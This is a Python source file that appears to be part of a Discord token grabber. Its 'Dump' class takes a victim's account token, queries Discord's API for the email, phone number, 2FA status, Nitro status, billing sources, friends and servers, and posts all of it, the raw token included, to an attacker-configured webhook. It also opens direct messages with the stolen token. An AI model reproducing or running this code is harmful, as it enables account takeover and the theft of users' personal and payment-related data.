import requests
import json
from discord_webhook   import DiscordWebhook, DiscordEmbed

from config import config

class Dump:
    def get_headers(self, token, content_type="application/json"):
        headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",      
    }
        if token:
            headers.update({"Authorization": token})
        return headers
    
    def get_details(self, token):
        data = requests.get('https://discordapp.com/api/v6/users/@me', headers=self.get_headers(token))
        return json.loads(data.text)
               
    def get_relationships(self, token):
        data = requests.get('https://discordapp.com/api/v6/users/@me/relationships', headers=self.get_headers(token))
        return len(json.loads(data.text))
    
    def get_guilds(self, token):
        data = requests.get("https://discordapp.com/api/v6/users/@me/guilds", headers=self.get_headers(token))

        return len(json.loads(data.text))
        
    def get_payment(self, token):
        data = requests.get("https://discordapp.com/api/users/@me/billing/payment-sources", headers=self.get_headers(token))
        data2 = len(json.loads(data.text))
        return bool(data2)
    

    
    
    def generate_embed(self, token):
        details = self.get_details(token)
        NITRO = False
        PHONE = details['phone']
        if not PHONE:
            PHONE = False
            
        if details["flags"]:
            NITRO = True
            
        embed = DiscordEmbed()
        embed.set_author(name=f"{details['username']}#{details['discriminator']}:{details['id']}", icon_url=f"https://cdn.discordapp.com/avatars/{details['id']}/{details['avatar']}.webp?size=128")
        embed.add_embed_field(name='Token',         value=token, inline=False)
        embed.add_embed_field(name='Email',         value=details['email'], inline=False)
        embed.add_embed_field(name='Phone',         value=PHONE, inline=False)
        embed.add_embed_field(name='2FA',           value=details["mfa_enabled"])
        embed.add_embed_field(name='Nitro',         value=NITRO)
        embed.add_embed_field(name='Billing',       value=self.get_payment(token))
        embed.add_embed_field(name='Relationships', value=self.get_relationships(token))
        embed.add_embed_field(name='Guilds',        value=self.get_guilds(token))
        embed.add_embed_field(name='Age',           value="322")
        return embed
    
    
    def send_webhook(self, token):
        webhook = DiscordWebhook(url=config["webhook_url"])
        
        webhook.add_embed(self.generate_embed(token))
        try:
            response = webhook.execute()
        except Exception:
            print('Failed to send webhook')
            
    def open_dm(self, token, recipient):
        print("opening dm")
        payload = json.dumps({"recipients": [recipient]})
        
        data = requests.post("https://discord.com/api/v9/users/@me/channels", headers=self.get_headers(token), data=payload)
        print(json.loads(data.text)['id'] + ' dm id')
        return json.loads(data.text)['id']
    

    

        